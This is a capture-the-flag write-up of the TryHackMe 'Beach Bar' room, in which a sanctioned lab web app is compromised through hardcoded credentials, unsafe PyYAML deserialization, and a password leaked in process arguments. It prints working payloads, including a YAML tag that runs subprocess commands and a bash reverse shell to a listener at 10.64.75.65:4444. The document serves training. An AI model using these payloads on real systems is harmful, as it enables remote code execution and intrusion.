<p align="center">
  <img src="https://assets.tryhackme.com/img/logo/tryhackme_logo_full.svg" width="150" alt="TryHackMe Logo">
</p>

# Beach Bar

| Room Name | Beach Bar |
|-----------|-----------|
| Platform | TryHackMe |
| Event | Hacker Holidays 2026 |
| Points | 60 |
| Category | 🐚 Boot2Root |
| Difficulty | Easy |
| Tags | Web Exploitation, Command Injection, YAML Deserialization, Privilege Escalation |
| Status | ✅ Completed |

## Room Information

```bash
Type: CTF Challenge
Difficulty: Easy
Category: Web Exploitation / Privilege Escalation

Description:
At the Beach Bar, even shell access is complimentary. The jukebox takes requests. Any kind.
```

## Challenge Overview

**Hacker Holidays: Day 5 — Beach Bar**

The Byte Lotus Hotel's beach bar features a web-based jukebox where guests can request songs. Unfortunately, the application was hastily developed and exposes multiple vulnerabilities. The goal is to exploit the web application, obtain a foothold on the server, escalate privileges, and recover both the user and root flags.

## Objectives

- Find the user flag
- Find the root flag

## Solution

- I read the challenge description, took a look at the objectives and at the bottom we see `Web` and `Boot2Root` which made me think that this has something to do with initial access, privilege escalation and root access

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/8a310147-aa7a-4fbc-8982-48348fece4fe" />
</p>

- I went to the link and landed here. Now, I wasn't sure what to do. I tried SQL injection and typing in weak username and passwords such as `admin` but that did not seem to work either
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/528e5a09-bcc1-41bc-a5c3-2c4e0f4b3e3c" />
</p>

- Then, I looked at the source code and I found some hardcoded credentials
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/bbf95292-e0cb-414c-8995-be2ce18bb095" />
</p>

- I now landed here. We are signed in as `dj` and it seems like I can download and upload a YAML file
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/f3cc98ba-792c-4ce2-a851-19c151021f2c" />
</p>

- Now this site asks me to download a YAML file and I can modify it and then upload it. This means the backend has to parse that YAML file and reconstruct Python, PHP or Node.js objects which is known as deserialization. This means I can conduct something known as a YAML deserialization attack

- Now, it is useful to know what software is parsing the YAML. I pressed `Ctrl + Shift + C` to open up developer tools and went to `Network` tab and saw in the `Response Headers` that the server is `Gunicorn` which heavily suggests this application is likely written in Python. I suspected that the YAML is likely being being parsed by a Python YAML library (such as PyYAML)

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/54e6216d-31c3-4c7d-b5ba-ba388a6633c3" />
</p>

- Since the application accepted YAML uploads and appeared to use a Python backend, I considered that the developer could have used `yaml.load()` instead of `yaml.safe_load()`. Unsafe uses of `yaml.load()` have allowed specially crafted YAML documents to be interpreted in unsafe ways known as unsafe deserialization. I first tested my theory with this command below and typed it in the YAML file
```
!!python/object/apply:subprocess.check_output [['whoami']]
```
- `!!python/object/apply` is a special Python-specific YAML tag that says call a python function while loading the YAML, `subprocess.check_output` is the Python function that is being called and `[['whoami']]` is the argument passed to that function and we know since the program loads the YAML in a unsafe way (`yaml.load()`) it should output the username of the current user

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/f987eafa-2a50-4462-b56c-c83ea974e239" />
</p>

- I saved the YAML file and uploaded it and we can see the username printed as `bartender`
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/0f668d33-e562-4fbe-96fc-b57b7925e76e" />
</p>

- Now, running one command at time is very tedious and so I was thinking, why not gain full shell access? First, I started a Netcat listener on TryHackMe's Attackbox
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/8f25f4cc-536b-410f-a34a-a7e9bbb96f9c" />
</p>

- Then, I typed this command into the YAML file. This command is a reverse bash shell and connects from the server to the Netcat listener
```
!!python/object/apply:subprocess.check_output [['bash', '-c', 'bash -i >& /dev/tcp/10.64.75.65/4444 0>&1']]
```
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/e6c9816e-cd99-4bcf-a70b-53e967085953" />
</p>

- BOOM!, we got full shell access and I even ran `whoami` to confirm I am running as the `bartender` user
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/08bd1f3e-b239-4389-a9a6-7d7aab13dddf" />
</p>

- Now, one of the goals was to find the user's flag. I would assume it might be hidden in the user's home directory so I gave that a try and I was able to retrieve the flag
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/4bf587b9-6d72-4559-9698-9a80c91e0b35" />
</p>

- Now to find the root flag, I needed to check if the user had sudo permissions and if it did, find the password which I did not have yet but it seems like my reverse shell wasn't even a fully interactive terminal yet
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/214aba46-f077-4555-af3c-4dd7ee7300e1" />
</p>

- I needed to find the password first. Looking at the challenge description, the clue `a DJ who never logs out` suggested there might be a process that is always running in the background. Another clue mentioned `a service down the boardwalk quietly announcing something`, which hinted that a running service might be exposing useful information. I checked the running processes with `ps aux`. Since there were many processes running, I searched specifically for `jukebox` because it was mentioned repeatedly throughout the challenge. This revealed the jukebox service and the password exposed in its command-line arguments

```
ps aux | grep jukebox
```

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/0f824603-079b-415d-9349-4b822801455d" />
</p>

- Since I have the password, I should be able to try `su root` and enter in the password but that did not work because the reverse shell wasn't a proper terminal. Password prompts and interactive programs don't always work correctly in a basic reverse shell. I was able to upgrade the terminal which gave me a normal terminal environment. I then switched to the root user and typed in the password and got a root shell
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/30f5a8c8-ccb6-488d-a75f-1e8769043b4d" />
</p>

- Now, I was able to go to the root's home directory and find the flag
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/7b0cd729-d74f-4c34-9b3c-84ed20067d3e" />
</p>

## Skills Learned

- Practiced web application enumeration and client-side source code inspection
- Identified exposed hardcoded credentials
- Learned how unsafe PyYAML deserialization can lead to remote code execution
- Crafted a basic YAML deserialization payload to execute system commands
- Gained a reverse shell using Bash and Netcat
- Performed basic Linux process enumeration to identify exposed credentials
- Practiced upgrading a reverse shell to a fully interactive TTY
- Used recovered credentials to escalate privileges

## Tools Used

* Firefox/Chrome Developer Tools
* Netcat (nc)
* Bash
* Python 3
  * Spawning an interactive TTY using the `pty` module
* Linux command-line utilities
  * `whoami`
  * `ps`
  * `grep`
  * `su`
  * `cd`
  * `cat`
* PyYAML payloads 
* TryHackMe AttackBox

## Flags

🚩 **User Flag:** `THM{************************}`

🚩 **Root Flag:** `THM{****************************}`
